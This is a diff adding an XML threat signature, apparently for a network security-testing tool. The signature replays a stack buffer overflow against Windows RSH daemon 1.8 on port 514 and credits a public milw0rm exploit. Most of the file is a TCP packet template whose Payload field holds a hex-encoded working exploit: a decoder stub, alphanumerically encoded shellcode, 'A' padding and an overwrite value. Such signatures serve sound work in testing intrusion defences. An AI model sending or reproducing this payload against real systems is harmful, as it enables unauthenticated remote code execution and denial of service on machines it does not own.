@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Windows RSH daemon Stack Based Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat demonstrates a stack overflow in Windows RSH daemon, that allows for execution arbitrary code or denial of service. Windows RSHD listens on port 514."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="RSH"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows_RSH_daemon"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_RSH_daemon_1.8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/4222"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="25044"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="206f4fab1c93634b6b3070891818fb4a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633209354179062500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1186713765" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="RSHdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$RSHdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="004100410041414141414141414141414141EB0359EB05E8F8FFFFFF494949494949494949494949494949494951375A6A66585030413142416B4141764132414132424130424158503841427579794B4C324A7A4B426D78684C394B4F4B4F4B4F75306E6B424C457471346C4B4155574C4E6B334C533551685551686F4C4B726F56786E6B614F77507661386B52694E6B36544E6B67714A4E76514F306D494E4C4D544B70416443374B716B7A766D54414F327A4B6A54456B33645644775834356B554C4B614F46445551586B31766C4B466C304B4E6B614F754C6441386B5333546C4C4B6D59506C6464554C30616B7374714B6B51744C4B515370304C4B7730366C4C4B7250354C4E4D6C4B73705778314E42484E6E504E766E5A4C30506B4F49467536563353567538374334723538743754334472636F71444B4F7A704248384B386D6B4C474B30504B4F4E36514F4F794D3542464B317A4D333857727635617A46624B4F6E3051784B69677959656C6D41474B4F6E364143563376335273705351537053326332736B4F4E30417662483647544F417672734F7949714E7531786E44676A64304F377057696F6E36706A7450627173654B4F385062484C644E4D646E586962774B4F7A7650535145396F585071786B5553796F7653793637396F79467270614433646275596F48504A3351786D3771697956716970576B4F6E365145696F6E304536635A4174353672483063506D6F795975635A527043693759584C4F797977524A33744D59397255614F307A536D7A796E4732764D696E4732346C6D436C4D725A54784E4B4C6B6C6B753852524B4E4E535546796F71654154596F4E36436B71475142527162715271517A33315631463151455051596F4E3050684C6D6E3953356A6E6273496F5A76506A596F4B4F3477596F5A706C4B3277396C6C434B7461746B4F6A765052796F6E3042487A4F6A6E5970635042734B4F4856796F4E3066414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141B736AE71" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
